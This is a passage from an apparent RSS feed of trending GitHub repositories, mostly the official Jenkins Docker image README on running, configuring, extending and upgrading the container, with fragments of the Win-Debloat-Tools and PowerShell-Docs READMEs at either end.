 &lt;li&gt;Special thanks to &lt;a href=&quot;https://youtu.be/sjrW74Hx5Po?t=318&quot;&gt;Fabio Akita&lt;/a&gt;, for believing in this project and making this script famous 🤍.&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/W4RH4WK&quot;&gt;W4RH4WK&lt;/a&gt; - For his project ^^&lt;/li&gt; 
 &lt;li&gt;[Tester] All of &lt;em&gt;my friends and people&lt;/em&gt; who trusted on me to run the script;&lt;/li&gt; 
 &lt;li&gt;[Tester] &lt;a href=&quot;https://github.com/yCr-shiddy&quot;&gt;yCr-shiddy&lt;/a&gt; - Helped giving more ideas and fixes;&lt;/li&gt; 
 &lt;li&gt;[Code] &lt;a href=&quot;https://www.youtube.com/channel/UCjidjWX76LR1g5yx18NSrLA&quot;&gt;Adamx&#39;s&lt;/a&gt; - by &lt;a href=&quot;https://youtu.be/hQSkPmZRCjc&quot;&gt;&lt;em&gt;this video&lt;/em&gt;&lt;/a&gt; (and script);&lt;/li&gt; 
 &lt;li&gt;[Code] &lt;a href=&quot;https://www.youtube.com/user/baboo&quot;&gt;Baboo&#39;s&lt;/a&gt; - by &lt;a href=&quot;https://youtu.be/qWESrvP_uU8&quot;&gt;&lt;em&gt;this video&lt;/em&gt;&lt;/a&gt; (and commands);&lt;/li&gt; 
 &lt;li&gt;[Code] &lt;a href=&quot;https://www.youtube.com/channel/UCg6gPGh8HU2U01vaFCAsvmQ&quot;&gt;ChrisTitusTech&lt;/a&gt; - by having taught how to mess with &lt;em&gt;PowerShell&lt;/em&gt; in &lt;a href=&quot;https://youtu.be/ER27pGt5wH0&quot;&gt;this Stream&lt;/a&gt; (and his &lt;em&gt;open-source&lt;/em&gt; debloat script);&lt;/li&gt; 
 &lt;li&gt;[Code] &lt;a href=&quot;https://www.youtube.com/channel/UCnG-TN23lswO6QbvWhMtxpA&quot;&gt;Daniel Persson&lt;/a&gt; - by &lt;a href=&quot;https://youtu.be/EfrT_Bvgles&quot;&gt;&lt;em&gt;this video&lt;/em&gt;&lt;/a&gt; (and script explanation);&lt;/li&gt; 
 &lt;li&gt;[Code] &lt;a href=&quot;https://gist.github.com/matthewjberger&quot;&gt;matthewjberger&lt;/a&gt; - by &lt;a href=&quot;https://gist.github.com/matthewjberger/2f4295887d6cb5738fa34e597f457b7f&quot;&gt;&lt;em&gt;this script&lt;/em&gt;&lt;/a&gt;.&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;🛣️ Roadmap&lt;/h2&gt; 
&lt;p&gt;List of all changes made on the script since the beginning, the file can be accessed &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/ROADMAP.md&quot;&gt;here&lt;/a&gt;.&lt;/p&gt; 
&lt;h2&gt;🏅 Recommended Alternative&lt;/h2&gt; 
&lt;p&gt;The scripts are designed to run without any user interaction. Modify them beforehand. If you want a more interactive approach (also more maintained) then check out:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://github.com/ChrisTitusTech/winutil&quot;&gt;winutil&lt;/a&gt; from &lt;a href=&quot;https://github.com/ChrisTitusTech&quot;&gt;ChrisTitusTech&lt;/a&gt;;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;📝 Legal / License&lt;/h2&gt; 
&lt;p&gt;&lt;em&gt;This project is NOT associated to &lt;strong&gt;MalwareBytes&lt;/strong&gt; and &lt;strong&gt;O&amp;amp;O Software GmbH&lt;/strong&gt; in any form.&lt;/em&gt; &lt;strong&gt;MalwareBytes AdwCleaner&lt;/strong&gt; and &lt;strong&gt;O&amp;amp;O ShutUp10++&lt;/strong&gt; have their own licenses.&lt;/p&gt; 
&lt;p&gt;Licensed under the &lt;a href=&quot;https://raw.githubusercontent.com/LeDragoX/Win-Debloat-Tools/main/LICENSE.txt&quot;&gt;MIT&lt;/a&gt; license.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>jenkinsci/docker</title>
      <link>https://github.com/jenkinsci/docker</link>
      <description>&lt;p&gt;Docker official jenkins repo&lt;/p&gt;&lt;hr&gt;&lt;h1&gt;Official Jenkins Docker image&lt;/h1&gt; 
&lt;p&gt;&lt;a href=&quot;https://hub.docker.com/r/jenkins/jenkins/&quot;&gt;&lt;img src=&quot;https://img.shields.io/docker/stars/jenkins/jenkins.svg?sanitize=true&quot; alt=&quot;Docker Stars&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://hub.docker.com/r/jenkins/jenkins/&quot;&gt;&lt;img src=&quot;https://img.shields.io/docker/pulls/jenkins/jenkins.svg?sanitize=true&quot; alt=&quot;Docker Pulls&quot;&gt;&lt;/a&gt; &lt;a href=&quot;https://gitter.im/jenkinsci/docker?utm_source=badge&amp;amp;utm_medium=badge&amp;amp;utm_campaign=pr-badge&amp;amp;utm_content=badge&quot;&gt;&lt;img src=&quot;https://badges.gitter.im/jenkinsci/docker.svg?sanitize=true&quot; alt=&quot;Join the chat at https://gitter.im/jenkinsci/docker&quot;&gt;&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;The Jenkins Continuous Integration and Delivery server &lt;a href=&quot;https://hub.docker.com/r/jenkins/jenkins&quot;&gt;available on Docker Hub&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;This is a fully functional Jenkins server. &lt;a href=&quot;https://jenkins.io/&quot;&gt;https://jenkins.io/&lt;/a&gt;.&lt;/p&gt; 
&lt;img src=&quot;https://jenkins.io/sites/default/files/jenkins_logo.png&quot;&gt; 
&lt;h1&gt;Usage&lt;/h1&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;NOTE: read the section &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/#connecting-agents&quot;&gt;&lt;em&gt;Connecting agents&lt;/em&gt;&lt;/a&gt; below for the role of the &lt;code&gt;50000&lt;/code&gt; port mapping. NOTE: read the section &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/#dns-configuration&quot;&gt;&lt;em&gt;DNS Configuration&lt;/em&gt;&lt;/a&gt; in case you see the message &quot;This Jenkins instance appears to be offline.&quot;&lt;/p&gt; 
&lt;p&gt;This will store the workspace in &lt;code&gt;/var/jenkins_home&lt;/code&gt;. All Jenkins data lives in there - including plugins and configuration. You will probably want to make that an explicit volume so you can manage it and attach to another container for upgrades :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 8080:8080 -p 50000:50000 --restart=on-failure -v jenkins_home:/var/jenkins_home jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This will automatically create a &#39;jenkins_home&#39; &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;docker volume&lt;/a&gt; on the host machine. Docker volumes retain their content even when the container is stopped, started, or deleted.&lt;/p&gt; 
&lt;p&gt;NOTE: Avoid using a &lt;a href=&quot;https://docs.docker.com/storage/bind-mounts/&quot;&gt;bind mount&lt;/a&gt; from a folder on the host machine into &lt;code&gt;/var/jenkins_home&lt;/code&gt;, as this might result in file permission issues (the user used inside the container might not have rights to the folder on the host machine). If you &lt;em&gt;really&lt;/em&gt; need to bind mount jenkins_home, ensure that the directory on the host is accessible by the jenkins user inside the container (jenkins user - uid 1000) or use &lt;code&gt;-u some_other_user&lt;/code&gt; parameter with &lt;code&gt;docker run&lt;/code&gt;.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -d -v jenkins_home:/var/jenkins_home -p 8080:8080 -p 50000:50000 --restart=on-failure jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This will run Jenkins in detached mode with port forwarding and volume added. You can access logs with command &#39;docker logs CONTAINER_ID&#39; in order to check first login token. ID of container will be returned from output of command above.&lt;/p&gt; 
&lt;h2&gt;Backing up data&lt;/h2&gt; 
&lt;p&gt;If you bind mount in a volume - you can simply back up that directory (which is jenkins_home) at any time.&lt;/p&gt; 
&lt;p&gt;Using a bind mount is not recommended since it can lead to permission issues. Treat the jenkins_home directory as you would a database - in Docker you would generally put a database on a volume.&lt;/p&gt; 
&lt;p&gt;If your volume is inside a container - you can use &lt;code&gt;docker cp $ID:/var/jenkins_home&lt;/code&gt; command to extract the data, or other options to find where the volume data is. Note that some symlinks on some OSes may be converted to copies (this can confuse jenkins with lastStableBuild links, etc)&lt;/p&gt; 
&lt;p&gt;For more info check Docker docs section on &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;Use volumes&lt;/a&gt;&lt;/p&gt; 
&lt;h2&gt;Setting the number of executors&lt;/h2&gt; 
&lt;p&gt;You can define the number of executors on the Jenkins built-in node using a groovy script. By default it is set to 2 executors, but you can extend the image and change it to your desired number of executors (recommended 0 executors on the built-in node) :&lt;/p&gt; 
&lt;p&gt;&lt;code&gt;executors.groovy&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;import jenkins.model.*
Jenkins.instance.setNumExecutors(0) // Recommended to not run builds on the built-in node
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;and &lt;code&gt;Dockerfile&lt;/code&gt;&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts
COPY --chown=jenkins:jenkins executors.groovy /usr/share/jenkins/ref/init.groovy.d/executors.groovy
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Connecting agents&lt;/h2&gt; 
&lt;p&gt;You can run builds on the controller out of the box. The Jenkins project recommends that no executors be enabled on the controller.&lt;/p&gt; 
&lt;p&gt;In order to connect agents &lt;strong&gt;through an inbound TCP connection&lt;/strong&gt;, map the port: &lt;code&gt;-p 50000:50000&lt;/code&gt;. That port will be used when you connect agents to the controller.&lt;/p&gt; 
&lt;p&gt;If you are only using &lt;a href=&quot;https://plugins.jenkins.io/ssh-slaves/&quot;&gt;SSH (outbound) build agents&lt;/a&gt;, this port is not required, as connections are established from the controller. If you connect agents using web sockets (since Jenkins 2.217), the TCP agent port is not used either.&lt;/p&gt; 
&lt;h2&gt;Passing JVM parameters&lt;/h2&gt; 
&lt;p&gt;You might need to customize the JVM running Jenkins, typically to adjust &lt;a href=&quot;https://www.jenkins.io/doc/book/managing/system-properties/&quot;&gt;system properties&lt;/a&gt; or tweak heap memory settings. Use the &lt;code&gt;JAVA_OPTS&lt;/code&gt; or &lt;code&gt;JENKINS_JAVA_OPTS&lt;/code&gt; environment variables for this purpose :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run --name myjenkins -p 8080:8080 -p 50000:50000 --restart=on-failure --env JAVA_OPTS=-Dhudson.footerURL=http://mycompany.com jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;JVM options specifically for the Jenkins controller should be set through &lt;code&gt;JENKINS_JAVA_OPTS&lt;/code&gt;, as other tools might also respond to the &lt;code&gt;JAVA_OPTS&lt;/code&gt; environment variable.&lt;/p&gt; 
&lt;h2&gt;Configuring logging&lt;/h2&gt; 
&lt;p&gt;Jenkins logging can be configured through a properties file and &lt;code&gt;java.util.logging.config.file&lt;/code&gt; Java property. For example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;mkdir data
cat &amp;gt; data/log.properties &amp;lt;&amp;lt;EOF
handlers=java.util.logging.ConsoleHandler
jenkins.level=FINEST
java.util.logging.ConsoleHandler.level=FINEST
EOF
docker run --name myjenkins -p 8080:8080 -p 50000:50000 --restart=on-failure --env JAVA_OPTS=&quot;-Djava.util.logging.config.file=/var/jenkins_home/log.properties&quot; -v `pwd`/data:/var/jenkins_home jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Configuring reverse proxy&lt;/h2&gt; 
&lt;p&gt;If you want to install Jenkins behind a reverse proxy with a prefix, example: mysite.com/jenkins, you need to add environment variable &lt;code&gt;JENKINS_OPTS=&quot;--prefix=/jenkins&quot;&lt;/code&gt; and then follow the below procedures to configure your reverse proxy, which will depend if you have Apache or Nginx:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.jenkins.io/doc/book/system-administration/reverse-proxy-configuration-apache/&quot;&gt;Apache&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;a href=&quot;https://www.jenkins.io/doc/book/system-administration/reverse-proxy-configuration-nginx/&quot;&gt;Nginx&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;h2&gt;DNS configuration&lt;/h2&gt; 
&lt;p&gt;If the message &quot;This Jenkins instance appears to be offline.&quot; appears on first startup, and the container logs show lines such as &lt;code&gt;java.net.UnknownHostException: updates.jenkins.io&lt;/code&gt;, your container may be having issues with resolving DNS names.&lt;/p&gt; 
&lt;p&gt;To potentially solve the issue, start the container specifying a dns server (for example Cloudflare&#39;s 1.1.1.1 or Google&#39;s 8.8.8.8, or any other DNS server):&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run -p 8080:8080 -p 50000:50000 --restart=on-failure --dns 1.1.1.1 --dns 8.8.8.8 jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Passing Jenkins launcher parameters&lt;/h2&gt; 
&lt;p&gt;Arguments you pass to docker running the Jenkins image are passed to jenkins launcher, so for example you can run:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run jenkins/jenkins:lts-jdk17 --version
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This will show the Jenkins version, the same as when you run Jenkins from an executable war.&lt;/p&gt; 
&lt;p&gt;You can also define Jenkins arguments via &lt;code&gt;JENKINS_OPTS&lt;/code&gt;. This is useful for customizing arguments to the jenkins launcher in a derived Jenkins image. The following sample Dockerfile uses this option to force use of HTTPS with a certificate included in the image.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17

COPY --chown=jenkins:jenkins certificate.pfx /var/lib/jenkins/certificate.pfx
COPY --chown=jenkins:jenkins https.key /var/lib/jenkins/pk
ENV JENKINS_OPTS=&quot;--httpPort=-1 --httpsPort=8083 --httpsKeyStore=/var/lib/jenkins/certificate.pfx --httpsKeyStorePassword=Password12&quot;
EXPOSE 8083
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;You can also change the default agent port for Jenkins by defining &lt;code&gt;JENKINS_SLAVE_AGENT_PORT&lt;/code&gt; in a sample Dockerfile.&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17
ENV JENKINS_SLAVE_AGENT_PORT=50001
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;or as a parameter to docker,&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;docker run --name myjenkins -p 8080:8080 -p 50001:50001 --restart=on-failure --env JENKINS_SLAVE_AGENT_PORT=50001 jenkins/jenkins:lts-jdk17
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;&lt;strong&gt;Note&lt;/strong&gt;: This environment variable will be used to set the &lt;a href=&quot;https://www.jenkins.io/doc/book/managing/system-properties/&quot;&gt;system property&lt;/a&gt; &lt;code&gt;jenkins.model.Jenkins.slaveAgentPort&lt;/code&gt;.&lt;/p&gt; 
&lt;blockquote&gt; 
 &lt;p&gt;If this property is already set in &lt;strong&gt;JAVA_OPTS&lt;/strong&gt; or &lt;strong&gt;JENKINS_JAVA_OPTS&lt;/strong&gt;, then the value of &lt;code&gt;JENKINS_SLAVE_AGENT_PORT&lt;/code&gt; will be ignored.&lt;/p&gt; 
&lt;/blockquote&gt; 
&lt;h1&gt;Installing more tools&lt;/h1&gt; 
&lt;p&gt;You can run your container as root - and install via apt-get, install as part of build steps via jenkins tool installers, or you can create your own Dockerfile to customise, for example:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17
# if we want to install via apt
USER root
RUN apt-get update &amp;amp;&amp;amp; apt-get install -y ruby make more-thing-here
# drop back to the regular jenkins user - good practice
USER jenkins
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;In such a derived image, you can customize your jenkins instance with hook scripts or additional plugins. For this purpose, use &lt;code&gt;/usr/share/jenkins/ref&lt;/code&gt; as a place to define the default JENKINS_HOME content you wish the target installation to look like :&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;FROM jenkins/jenkins:lts-jdk17
COPY --chown=jenkins:jenkins custom.groovy /usr/share/jenkins/ref/init.groovy.d/custom.groovy
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Preinstalling plugins&lt;/h2&gt; 
&lt;h3&gt;Install plugins&lt;/h3&gt; 
&lt;p&gt;You can rely on &lt;a href=&quot;https://github.com/jenkinsci/plugin-installation-manager-tool/&quot;&gt;the plugin manager CLI&lt;/a&gt; to pass a set of plugins to download with their dependencies. This tool will perform downloads from update centers, and internet access is required for the default update centers.&lt;/p&gt; 
&lt;h3&gt;Setting update centers&lt;/h3&gt; 
&lt;p&gt;During the download, the CLI will use update centers defined by the following environment variables:&lt;/p&gt; 
&lt;ul&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_UC&lt;/code&gt; - Main update center. This update center may offer plugin versions depending on the Jenkins LTS Core versions. Default value: &lt;a href=&quot;https://updates.jenkins.io&quot;&gt;https://updates.jenkins.io&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_UC_EXPERIMENTAL&lt;/code&gt; - &lt;a href=&quot;https://jenkins.io/blog/2013/09/23/experimental-plugins-update-center/&quot;&gt;Experimental Update Center&lt;/a&gt;. This center offers Alpha and Beta versions of plugins. Default value: &lt;a href=&quot;https://updates.jenkins.io/experimental&quot;&gt;https://updates.jenkins.io/experimental&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_INCREMENTALS_REPO_MIRROR&lt;/code&gt; - Defines Maven mirror to be used to download plugins from the &lt;a href=&quot;https://jenkins.io/blog/2018/05/15/incremental-deployment/&quot;&gt;Incrementals repo&lt;/a&gt;. Default value: &lt;a href=&quot;https://repo.jenkins-ci.org/incrementals&quot;&gt;https://repo.jenkins-ci.org/incrementals&lt;/a&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_UC_DOWNLOAD&lt;/code&gt; - Download url of the Update Center. Default value: &lt;code&gt;$JENKINS_UC/download&lt;/code&gt;&lt;/li&gt; 
 &lt;li&gt;&lt;code&gt;JENKINS_PLUGIN_INFO&lt;/code&gt; - Location of plugin information. Default value: &lt;a href=&quot;https://updates.jenkins.io/current/plugin-versions.json&quot;&gt;https://updates.jenkins.io/current/plugin-versions.json&lt;/a&gt;&lt;/li&gt; 
&lt;/ul&gt; 
&lt;p&gt;It is possible to override the environment variables in images.&lt;/p&gt; 
&lt;p&gt;&lt;span&gt;❗&lt;/span&gt; Note that changing update center variables &lt;strong&gt;will not&lt;/strong&gt; change the Update Center being used by Jenkins runtime, it concerns only the plugin manager CLI.&lt;/p&gt; 
&lt;h3&gt;Installing Custom Plugins&lt;/h3&gt; 
&lt;p&gt;Installing prebuilt, custom plugins can be accomplished by copying the plugin HPI file into &lt;code&gt;/usr/share/jenkins/ref/plugins/&lt;/code&gt; within the &lt;code&gt;Dockerfile&lt;/code&gt;:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;COPY --chown=jenkins:jenkins path/to/custom.hpi /usr/share/jenkins/ref/plugins/
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Usage&lt;/h3&gt; 
&lt;p&gt;You can run the CLI manually in Dockerfile:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-Dockerfile&quot;&gt;FROM jenkins/jenkins:lts-jdk17
RUN jenkins-plugin-cli --plugins pipeline-model-definition github-branch-source:1.8
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Furthermore it is possible to pass a file that contains this set of plugins (with or without line breaks).&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-Dockerfile&quot;&gt;FROM jenkins/jenkins:lts-jdk17
COPY --chown=jenkins:jenkins plugins.txt /usr/share/jenkins/ref/plugins.txt
RUN jenkins-plugin-cli -f /usr/share/jenkins/ref/plugins.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;When jenkins container starts, it will check &lt;code&gt;JENKINS_HOME&lt;/code&gt; has this reference content, and copy them there if required. It will not override such files, so if you upgraded some plugins from UI they won&#39;t be reverted on next start.&lt;/p&gt; 
&lt;p&gt;In case you &lt;em&gt;do&lt;/em&gt; want to override, append &#39;.override&#39; to the name of the reference file. E.g. a file named &lt;code&gt;/usr/share/jenkins/ref/config.xml.override&lt;/code&gt; will overwrite an existing &lt;code&gt;config.xml&lt;/code&gt; file in JENKINS_HOME.&lt;/p&gt; 
&lt;p&gt;Also see &lt;a href=&quot;https://issues.jenkins.io/browse/JENKINS-24986&quot;&gt;JENKINS-24986&lt;/a&gt;&lt;/p&gt; 
&lt;p&gt;Here is an example to get the list of plugins from an existing server:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;JENKINS_HOST=username:password@myhost.com:port
curl -sSL &quot;http://$JENKINS_HOST/pluginManager/api/xml?depth=1&amp;amp;xpath=/*/*/shortName|/*/*/version&amp;amp;wrapper=plugins&quot; | perl -pe &#39;s/.*?&amp;lt;shortName&amp;gt;([\w-]+).*?&amp;lt;version&amp;gt;([^&amp;lt;]+)()(&amp;lt;\/\w+&amp;gt;)+/\1 \2\n/g&#39;|sed &#39;s/ /:/&#39;
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;Example Output:&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;cucumber-testresult-plugin:0.8.2
pam-auth:1.1
matrix-project:1.4.1
script-security:1.13
...
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;For 2.x-derived images, you may also want to&lt;/p&gt; 
&lt;pre&gt;&lt;code&gt;RUN echo 2.0 &amp;gt; /usr/share/jenkins/ref/jenkins.install.UpgradeWizard.state
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;to indicate that this Jenkins installation is fully configured. Otherwise a banner will appear prompting the user to install additional plugins, which may be inappropriate.&lt;/p&gt; 
&lt;h3&gt;Access logs&lt;/h3&gt; 
&lt;p&gt;To enable Jenkins user access logs from Jenkins home directory inside a docker container, set the &lt;code&gt;JENKINS_OPTS&lt;/code&gt; environment variable value to &lt;code&gt;--accessLoggerClassName=winstone.accesslog.SimpleAccessLogger --simpleAccessLogger.format=combined --simpleAccessLogger.file=/var/jenkins_home/logs/access_log&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;Naming convention in tags&lt;/h3&gt; 
&lt;p&gt;The naming convention for the tags on Docker Hub follows the format &lt;code&gt;&amp;lt;repository_name&amp;gt;:&amp;lt;tag&amp;gt;&lt;/code&gt;, where the repository name is jenkins/jenkins and where the tag specifies the image version. In the case of the LTS and latest versions, the tags are &lt;code&gt;lts&lt;/code&gt; and &lt;code&gt;latest&lt;/code&gt;, respectively.&lt;/p&gt; 
&lt;p&gt;You can use these tags to pull the corresponding Jenkins images from Docker Hub and run them on your system. For example, to pull the LTS version of the Jenkins image use this command: &lt;code&gt;docker pull jenkins/jenkins:lts&lt;/code&gt;&lt;/p&gt; 
&lt;h3&gt;Docker Compose with Jenkins&lt;/h3&gt; 
&lt;p&gt;To use Docker Compose with Jenkins, you can define a docker-compose.yml file including a Jenkins instance and any other services it depends on. For example, the following docker-compose.yml file defines a Jenkins controller and a Jenkins SSH agent:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;services:
  jenkins:
    image: jenkins/jenkins:lts
    ports:
      - &quot;8080:8080&quot;
    volumes:
      - jenkins_home:/var/jenkins_home
  ssh-agent:
    image: jenkins/ssh-agent
volumes:
  jenkins_home:
&lt;/code&gt;&lt;/pre&gt; 
&lt;p&gt;This &lt;code&gt;docker-compose.yml&lt;/code&gt; file creates two containers: one for Jenkins and one for the Jenkins SSH agent.&lt;/p&gt; 
&lt;p&gt;The Jenkins container is based on the &lt;code&gt;jenkins/jenkins:lts&lt;/code&gt; image and exposes the Jenkins web interface on port 8080. The &lt;code&gt;jenkins_home&lt;/code&gt; volume is a &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;named volume&lt;/a&gt; that is created and managed by Docker.&lt;/p&gt; 
&lt;p&gt;It is mounted at &lt;code&gt;/var/jenkins_home&lt;/code&gt; in the Jenkins container, and it will persist the Jenkins configuration and data.&lt;/p&gt; 
&lt;p&gt;The ssh-agent container is based on the &lt;code&gt;jenkins/ssh-agent&lt;/code&gt; image and runs an SSH server to execute &lt;a href=&quot;https://plugins.jenkins.io/ssh-slaves/&quot;&gt;Jenkins SSH Build Agent&lt;/a&gt;.&lt;/p&gt; 
&lt;p&gt;To start the Jenkins instance and the other services defined in the &lt;code&gt;docker-compose.yml&lt;/code&gt; file, run the &lt;code&gt;docker compose up -d&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;This will pull the necessary images from Docker Hub if they are not already present on your system, and start the services in the background.&lt;/p&gt; 
&lt;p&gt;You can then access the Jenkins web interface on &lt;code&gt;http://localhost:8080&lt;/code&gt; on your host system to configure and manage your Jenkins instance (where &lt;code&gt;localhost&lt;/code&gt; points to the published port by your Docker Engine).&lt;/p&gt; 
&lt;p&gt;NOTE: read the section &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/#dns-configuration&quot;&gt;&lt;em&gt;DNS Configuration&lt;/em&gt;&lt;/a&gt; in case you see the message &quot;This Jenkins instance appears to be offline.&quot; In that case add the dns configuration to the yaml:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-yaml&quot;&gt;services:
  jenkins:
# ... other config
    dns:
      - 1.1.1.1
      - 8.8.8.8
# ... other config
&lt;/code&gt;&lt;/pre&gt; 
&lt;h3&gt;Updating plugins file&lt;/h3&gt; 
&lt;p&gt;The &lt;a href=&quot;https://github.com/jenkinsci/plugin-installation-manager-tool&quot;&gt;plugin-installation-manager-tool&lt;/a&gt; supports updating the plugin file for you.&lt;/p&gt; 
&lt;p&gt;Example command:&lt;/p&gt; 
&lt;pre&gt;&lt;code class=&quot;language-command&quot;&gt;JENKINS_IMAGE=jenkins/jenkins:lts-jdk17
docker run -it ${JENKINS_IMAGE} bash -c &quot;stty -onlcr &amp;amp;&amp;amp; jenkins-plugin-cli -f /usr/share/jenkins/ref/plugins.txt --available-updates --output txt&quot; &amp;gt;  plugins2.txt
mv plugins2.txt plugins.txt
&lt;/code&gt;&lt;/pre&gt; 
&lt;h2&gt;Upgrading&lt;/h2&gt; 
&lt;p&gt;All the data needed is in the /var/jenkins_home directory - so depending on how you manage that - depends on how you upgrade. Generally - you can copy it out - and then &quot;docker pull&quot; the image again - and you will have the latest LTS - you can then start up with -v pointing to that data (/var/jenkins_home) and everything will be as you left it.&lt;/p&gt; 
&lt;p&gt;As always - please ensure that you know how to drive docker - especially volume handling!&lt;/p&gt; 
&lt;p&gt;If you mount the Jenkins home directory to a &lt;a href=&quot;https://docs.docker.com/storage/volumes/&quot;&gt;Docker named volume&lt;/a&gt;, then the upgrade consists of &lt;code&gt;docker pull&lt;/code&gt; and nothing more.&lt;/p&gt; 
&lt;p&gt;We recommend using &lt;code&gt;docker compose&lt;/code&gt;, especially in cases where the user is also running a parallel nginx/apache container as a reverse proxy for the Jenkins container.&lt;/p&gt; 
&lt;h3&gt;Upgrading plugins&lt;/h3&gt; 
&lt;p&gt;By default, plugins will be upgraded if they haven&#39;t been upgraded manually and if the version from the docker image is newer than the version in the container. Versions installed by the docker image are tracked through a marker file.&lt;/p&gt; 
&lt;p&gt;To force upgrades of plugins that have been manually upgraded, run the docker image with &lt;code&gt;-e PLUGINS_FORCE_UPGRADE=true&lt;/code&gt;.&lt;/p&gt; 
&lt;p&gt;The default behaviour when upgrading from a docker image that didn&#39;t write marker files is to leave existing plugins in place. If you want to upgrade existing plugins without marker you may run the docker image with &lt;code&gt;-e TRY_UPGRADE_IF_NO_MARKER=true&lt;/code&gt;. Then plugins will be upgraded if the version provided by the docker image is newer.&lt;/p&gt; 
&lt;h1&gt;Hacking&lt;/h1&gt; 
&lt;p&gt;If you wish to contribute fixes to this repository, please refer to the &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/HACKING.adoc&quot;&gt;dedicated documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Security&lt;/h1&gt; 
&lt;p&gt;For information related to the security of this Docker image, please refer to the &lt;a href=&quot;https://raw.githubusercontent.com/jenkinsci/docker/master/SECURITY.md&quot;&gt;dedicated documentation&lt;/a&gt;.&lt;/p&gt; 
&lt;h1&gt;Questions?&lt;/h1&gt; 
&lt;p&gt;We&#39;re on Gitter, &lt;a href=&quot;https://gitter.im/jenkinsci/docker&quot;&gt;https://gitter.im/jenkinsci/docker&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>MicrosoftDocs/PowerShell-Docs</title>
      <link>https://github.com/MicrosoftDocs/PowerShell-Docs</link>
      <description>&lt;p&gt;The official PowerShell documentation sources&lt;/p&gt;&lt;hr&gt;&lt;hr&gt; 
&lt;h2&gt;ms.date: 01/17/2025&lt;/h2&gt; 
&lt;h1&gt;PowerShell Documentation&lt;/h1&gt; 
&lt;p&gt;Welcome to the PowerShell-Docs repository, the home of the official PowerShell documentation.&lt;/p&gt; 
&lt;h2&gt;Microsoft Open Source Code of Conduct&lt;/h2&gt; 
